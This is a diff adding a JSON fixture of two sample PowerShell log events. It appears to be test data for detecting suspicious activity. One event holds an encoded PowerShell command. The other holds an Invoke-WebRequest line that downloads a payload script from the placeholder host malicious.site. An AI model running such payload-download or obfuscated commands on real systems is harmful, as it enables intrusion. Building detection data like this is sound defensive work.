@@ -1,0 +1,17 @@
+[
+    {
+      "timestamp": "2025-06-23T14:32:00Z",
+      "host": "win10host01",
+      "user": "admin_user",
+      "event_type": "powershell_execution",
+      "command_line": "powershell.exe -enc ZABlAGwAZQB0AC0AYwBlAGkAbABlAG4AdAAgAGYAbwByAGUAYwBhAHMAdABzAA=="
+    },
+    {
+      "timestamp": "2025-06-23T14:33:00Z",
+      "host": "win10host02",
+      "user": "dev_admin",
+      "event_type": "powershell_execution",
+      "command_line": "powershell.exe -Command Invoke-WebRequest http://malicious.site/payload.ps1"
+    }
+  ]
+  
